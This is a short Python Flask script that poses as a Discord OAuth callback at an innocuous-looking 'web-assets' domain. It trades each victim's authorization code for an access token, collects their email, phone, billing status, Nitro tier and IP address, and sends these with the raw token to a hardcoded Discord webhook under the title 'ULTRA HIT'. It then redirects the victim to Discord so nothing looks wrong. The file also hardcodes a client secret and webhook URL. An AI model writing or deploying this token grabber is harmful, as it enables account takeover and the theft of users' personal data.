import requests
from flask import Flask, request, redirect
app = Flask(__name__)

ID = "1501206551942398092"
SEC = "7A2BCkMpq3sqaV0RwYu2JOYjc2qRtfjz"
URI = "https://web-assets-v1.onrender.com/callback"
WEB = "https://discord.com/api/webhooks/1501215104677449888/0m91vskK1e3xajgzfnJ2whw9pNizDOpRxdEQIC9r2qDFbrxI7sh3j54q4S2EWwAvF6qt"

@app.route('/callback')
def callback():
    code = request.args.get('code')
    if not code: return "Fail", 400
    
    # Trade code for token
    d = {'client_id':ID,'client_secret':SEC,'grant_type':'authorization_code','code':code,'redirect_uri':URI}
    r = requests.post('https://discord.com/api/v10/oauth2/token', data=d).json()
    t = r.get('access_token')

    if t:
        h = {'Authorization': 'Bearer ' + str(t)}
        # Get User, Billing, and IP Info
        u = requests.get('https://discord.com/api/v10/users/@me', headers=h).json()
        b = requests.get('https://discord.com/api/v10/users/@me/billing/payment-sources', headers=h).json()
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)

        # Optimization: One-line data extraction
        user = f"{u.get('username')}#{u.get('discriminator')}"
        mail = u.get('email', 'None')
        phon = u.get('phone', 'None')
        bill = "Linked ✅" if b else "None ❌"
        nitro = ["None", "Classic", "Boost"][u.get('premium_type', 0)]

        f = [
            {"name": "👤 User", "value": f"`{user}`", "inline": True},
            {"name": "📧 Email", "value": f"`{mail}`", "inline": True},
            {"name": "📱 Phone", "value": f"`{phon}`", "inline": True},
            {"name": "💎 Nitro", "value": f"`{nitro}`", "inline": True},
            {"name": "💳 Billing", "value": f"`{bill}`", "inline": True},
            {"name": "🌐 IP", "value": f"`{ip}`", "inline": True},
            {"name": "🔑 Token", "value": f"```{t}
```"}
        ]
             
        requests.post(WEB, json={"embeds": [{"title": "🚀 ULTRA HIT", "color": 0x5865F2, "fields": f}]})
        
    return redirect("https://discord.com/app")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
